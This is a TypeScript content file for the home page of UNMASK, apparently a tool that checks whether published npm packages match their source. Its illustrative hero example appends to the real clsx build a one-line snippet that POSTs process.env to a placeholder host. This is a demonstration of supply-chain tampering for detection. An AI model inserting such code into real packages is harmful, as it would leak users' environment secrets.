// Copy and figures shared by the home page. Every figure here is real unless its
// comment says it is illustrative.

export const links = {
  docs: "https://github.com/Vaiditya2207/unmask/tree/main/docs",
  cli: "https://github.com/Vaiditya2207/unmask/blob/main/docs/cli.md",
  source: "https://github.com/Vaiditya2207/unmask",
  issues: "https://github.com/Vaiditya2207/unmask/issues",
  example: "/r/sample",
} as const;

export const legal = "© 2026 Cappybara contributors. MIT licence.";

// Public npm incidents where the published code was not in the project's repository.
export const incidents = [
  {
    name: "flatmap-stream 0.1.1",
    href: "https://tag-security.cncf.io/community/catalog/compromises/2018/event_stream/",
  },
  {
    name: "eslint-scope 3.7.2",
    href: "https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes",
  },
  {
    name: "ua-parser-js 0.7.29",
    href: "https://github.com/advisories/GHSA-pjwm-rvh2-c87w",
  },
  {
    name: "chalk and debug",
    href: "https://cycode.com/blog/npm-debug-chalk-supply-chain-attack-the-complete-guide/",
  },
  {
    name: "@ctrl/tinycolor 4.1.1",
    href: "https://truesec.com/hub/blog/500-npm-packages-compromised-in-ongoing-supply-chain-attack-shai-hulud",
  },
] as const;

// Illustrative: the real CommonJS build of clsx@2.1.1 followed by an appended block
// that no source file contains. The hero shows it; no package is named.
export const heroExample = {
  build:
    'function r(e){var o,t,f="";if("string"==typeof e||"number"==typeof e)f+=e;else if("object"==typeof e)if(Array.isArray(e)){var n=e.length;for(o=0;o<n;o++)e[o]&&(t=r(e[o]))&&(f&&(f+=" "),f+=t)}else for(t in e)e[t]&&(f&&(f+=" "),f+=t);return f}function e(){for(var e,o,t=0,f="",n=arguments.length;t<n;t++)(e=arguments[t])&&(o=r(e))&&(f&&(f+=" "),f+=o);return f}module.exports=e,module.exports.clsx=e;',
  appended:
    ';(function(){try{require("https").request({hostname:"collect.example.invalid",path:"/e",method:"POST"}).end(JSON.stringify(process.env))}catch(e){}})();',
  source:
    "export function clsx() {\n\tvar i=0, tmp, x, str='', len=arguments.length;\n\tfor (; i < len; i++) {\n\t\tif (tmp = arguments[i]) {\n\t\t\tif (x = toVal(tmp)) {\n\t\t\t\tstr && (str += ' ');\n\t\t\t\tstr += x\n\t\t\t}\n\t\t}\n\t}\n\treturn str;\n}",
} as const;

// Real: what one check of esbuild@0.28.2 read, from the server's run observations.
export const pipeline = {
  release: "esbuild@0.28.2",
  seconds: 1.2,
  stages: [
    {
      bytes: 5022,
      label: "5 KB",
      clause: "First, the registry record names the tarball and the source.",
    },
    {
      bytes: 34207,
      label: "34 KB",
      clause: "Then the tarball is downloaded and read as data. Nothing runs.",
    },
    {
      bytes: 2011018,
      label: "2.0 MB",
      clause: "Then the source is fetched at the commit the release claims.",
    },
    {
      bytes: 147361,
      label: "147 KB",
      clause:
        "Last, every file is compared, byte by byte, and written up with its evidence.",
    },
  ],
} as const;

export const examples = [
  "esbuild@0.28.2",
  "@sigstore/core@4.0.1",
  "left-pad@1.3.0",
] as const;

export const questions = [
  {
    q: "Does UNMASK say a package is safe?",
    a: "No. It shows what differs and the evidence for each difference. A release whose bytes all match its source can still do harm, so the report never ends in a verdict of safe.",
  },
  {
    q: "Does it run the package?",
    a: "No. The tarball is read as files. Install scripts, build scripts and tests are never executed.",
  },
  {
    q: "Which releases can it check?",
    a: "Public npm packages at an exact version, such as clsx@2.1.1. Tags, version ranges, URLs and uploaded files are not accepted.",
  },
  {
    q: "Where does the source come from?",
    a: "From the source the registry points to for the release, such as its repository and gitHead commit. The report names the source it compared and says when that match is incomplete.",
  },
  {
    q: "What does the model do?",
    a: "AI explains selected evidence and suggests what to review next. Quotes are checked against the files. The report names the model used and shows when AI is unavailable; it never overrides the deterministic findings.",
  },
  {
    q: "How long is a report kept?",
    a: "Up to 30 minutes after it finishes, and capacity eviction or a restart can remove it sooner. Download the JSON to keep the evidence.",
  },
] as const;
